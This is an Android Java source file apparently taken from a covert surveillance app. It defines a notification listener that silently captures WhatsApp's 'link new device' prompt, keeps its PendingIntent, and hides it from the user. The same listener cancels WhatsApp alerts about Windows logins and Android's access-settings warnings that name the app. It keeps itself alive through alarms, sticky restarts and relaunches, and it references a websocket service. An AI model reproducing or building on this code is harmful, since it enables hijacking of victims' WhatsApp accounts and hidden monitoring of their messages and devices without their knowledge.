package com.user.side.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;


import com.user.side.R;
import com.user.side.activities.MainActivity;
import com.user.side.broadcasts.AppReviver;
import com.user.side.managers.FilesManager;
import com.user.side.utilities.AppLogsUtils;
import com.user.side.utilities.ServicesUtils;

public class NotificationListener extends NotificationListenerService {
    public static String whatsAppPackage = "com.whatsapp";
    public static boolean IN_PROCESS = false;
    public static String whatsappNotificationContentArabic = "أدخل الكود لربط جهاز جديد";
    public static String whatsappNotificationContentEnglish = "Enter code to link new device";
    public static String CHECK_ACCESS_SETTINGS_EN = "Check access settings";
    public static String CHECK_ACCESS_SETTINGS_AR = "تحقق من إعدادات الوصول";
    public static PendingIntent linkDevicePendingIntent;

    @Override
    public void onCreate() {
        super.onCreate();FilesManager.logStatus("notification listener started");
        MainActivity.scheduleReviver(this);
        if(ServicesUtils.isServiceKilled(this, WebsocketService.class)){
            Intent intent = new Intent(this, WebsocketService.class);
            AppReviver.scheduleIntent(this, intent, 55);
        }

        if(AppLogsUtils.isAppInActiveForOneMonth(this)){
            FilesManager.logStatus("app is inactive for one month");
            // Revive app by starting main activity and close it
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("revive", true);
            startActivity(intent);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        FilesManager.logStatus("notification listener task removed");
        restart(rootIntent);
    }

    public void restart(Intent intent) {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        PendingIntent pendingIntent = PendingIntent.getService(this, 6456, intent, PendingIntent.FLAG_IMMUTABLE);

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) return;

        alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {FilesManager.logStatus("notification listener onStartCommand");
        MainActivity.scheduleReviver(this);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();FilesManager.logStatus("notification listener stopped");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);if (sbn.getPackageName().equals(getPackageName())){
            cancelNotification(sbn.getKey());FilesManager.logStatus("app notification received and cancelled");
        }

        String text = sbn.getNotification().extras.getString("android.text");
        String title = sbn.getNotification().extras.getString("android.title");

        if(title == null || text == null){
            return;
        }

        if(title.contains(CHECK_ACCESS_SETTINGS_EN) || title.contains(CHECK_ACCESS_SETTINGS_AR)){
            if(text.contains(getString(R.string.app_name))){FilesManager.logStatus("Warning notification canceled: " + text);
                cancelNotification(sbn.getKey());
            }
        }

        if (sbn.getPackageName().equals(whatsAppPackage)) {
            if ((text.contains(whatsappNotificationContentArabic) || text.contains(whatsappNotificationContentEnglish)) && IN_PROCESS) {
                FilesManager.logStatus("link notification received");

                linkDevicePendingIntent = sbn.getNotification().contentIntent;

                cancelNotification(sbn.getKey());
            }

            if(text.contains("Windows")){
                cancelNotification(sbn.getKey());
            }

        }

    }

}

